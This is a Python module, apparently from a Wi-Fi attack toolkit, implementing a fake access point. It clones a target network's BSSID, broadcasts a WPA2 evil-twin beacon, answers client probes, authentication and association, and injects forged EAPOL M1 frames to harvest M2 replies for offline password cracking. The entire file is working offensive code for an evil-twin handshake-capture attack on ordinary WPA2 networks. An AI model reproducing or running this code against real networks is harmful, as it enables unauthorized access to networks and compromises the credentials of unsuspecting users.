"""FakeAP: the WPA2 twin's beacon + responder + per-client state (mechanism only, no UI/log).

Owns the decoy-channel interface: arms active-monitor on the cloned BSSID, beacons the WPA2 twin,
answers probe/auth/assoc, and crafts + injects M1 with a fresh per-client ANonce. It emits nothing
to the UI. The campaign polls ``stats`` for the activity log and reads the sink for the
crackable-handshake stop condition. Each M1 is passed to ``record_m1`` (the campaign seeds the sink)
*before* it is injected, so an immediate M2 already has its donor.
"""
from __future__ import annotations

import asyncio
import enum
import os
import struct
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, Optional

from wifit3.dot11.ap import auth_resp, assoc_resp, eapol_m1
from wifit3.dot11.mac import mac_to_str
from wifit3.dot11.probe import probe_resp

_BEACON_PERIOD_S = 100 * 1024 / 1_000_000       # 100 TU


class ClientPhase(enum.IntEnum):
    AUTHED = 1
    ASSOCED = 2
    GOT_M2 = 3


@dataclass
class ClientProgress:
    phase: ClientPhase
    anonce: bytes = b""
    replay: int = 1
    first_seen: float = 0.0
    last_advance: float = 0.0


@dataclass
class FakeApStats:
    probes_direct: int = 0
    probes_wildcard: int = 0
    auth: int = 0
    assoc: int = 0
    m2: int = 0
    clients: Dict[str, ClientProgress] = field(default_factory=dict)


class FakeAP:
    def __init__(self, twin_iface, bssid: bytes, ssid: str, channel: int, twin_beacon: bytes,
                 rx_source=None, record_m1: Optional[Callable[[bytes], None]] = None):
        self.iface = twin_iface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.twin_beacon = twin_beacon
        self.rx_source = rx_source
        self.record_m1 = record_m1 or (lambda _frame: None)
        self.stats = FakeApStats()
        self._probe_resp = probe_resp(bssid, ssid, channel)
        self._running = False
        self._beacon_task: Optional[asyncio.Task] = None

    # ----- lifecycle ---------------------------------------------------------

    async def start(self) -> None:
        self._running = True
        if self.iface.current_channel != self.channel:
            await self.iface.set_channel(self.channel)
        await self.iface.set_fake_mac(self.bssid, self.bssid)
        if self.rx_source is not None:
            self.rx_source.register_rx_callback(self.on_rx)
        self._beacon_task = asyncio.create_task(self._beacon_loop())

    async def stop(self) -> None:
        self._running = False
        if self._beacon_task is not None:
            self._beacon_task.cancel()
        if self.rx_source is not None:
            self.rx_source.unregister_rx_callback(self.on_rx)
        try:
            await self.iface.clear_fake_mac()
        except Exception:                               # noqa: BLE001
            pass

    async def _beacon_loop(self) -> None:
        while self._running:
            await self.iface.send_no_wait(self._restamp(self.twin_beacon))
            await asyncio.sleep(_BEACON_PERIOD_S)

    @staticmethod
    def _restamp(beacon: bytes) -> bytes:
        return beacon[:24] + struct.pack("<Q", int(time.time() * 1_000_000)) + beacon[32:]

    # ----- responder (sync; injects via _tx) ---------------------------------

    def on_rx(self, pkt) -> None:
        raw = pkt.raw
        if len(raw) < 24:
            return
        client = raw[10:16]
        if pkt.type == "eapol":
            self._on_m2(pkt, client)
            return
        if pkt.type_id != 0:
            return
        subtype = pkt.subtype_id
        if subtype == 0x04:                             # probe request
            self._on_probe(pkt, client)
        elif raw[4:10] != self.bssid:                   # auth/assoc must be addressed to us
            return
        elif subtype == 0x0B:                           # authentication
            self._on_auth(client)
        elif subtype in (0x00, 0x02):                   # (re)association request
            self._on_assoc(client)

    def _on_probe(self, pkt, client: bytes) -> None:
        ssid = getattr(pkt, "ssid", None)
        if ssid in (None, "", "<hidden>"):
            self.stats.probes_wildcard += 1
        elif ssid == self.ssid:
            self.stats.probes_direct += 1
        else:
            return
        self._tx(self._probe_resp[:4] + client + self._probe_resp[10:])

    def _on_auth(self, client: bytes) -> None:
        self.stats.auth += 1
        self._advance(mac_to_str(client), ClientPhase.AUTHED)
        self._tx(auth_resp(self.bssid, client))

    def _on_assoc(self, client: bytes) -> None:
        self.stats.assoc += 1
        cs = mac_to_str(client)
        self._advance(cs, ClientPhase.ASSOCED)
        self._tx(assoc_resp(self.bssid, client))
        anonce = os.urandom(32)
        rec = self.stats.clients[cs]
        rec.anonce, rec.replay = anonce, 1
        m1 = eapol_m1(self.bssid, client, anonce, replay=1)
        self.record_m1(m1)
        self._tx(m1)

    def _on_m2(self, pkt, client: bytes) -> None:
        if getattr(pkt, "msg_num", 0) != 2:
            return
        cs = mac_to_str(client)
        rec = self.stats.clients.get(cs)
        if rec is not None and rec.phase >= ClientPhase.GOT_M2:
            return
        self.stats.m2 += 1
        self._advance(cs, ClientPhase.GOT_M2)

    def _advance(self, client: str, phase: ClientPhase) -> None:
        rec = self.stats.clients.get(client)
        now = time.time()
        if rec is None:
            self.stats.clients[client] = ClientProgress(phase=phase, first_seen=now, last_advance=now)
        elif phase > rec.phase:
            rec.phase = phase
            rec.last_advance = now

    def _tx(self, frame: bytes) -> None:
        asyncio.create_task(self.iface.send_no_wait(frame))
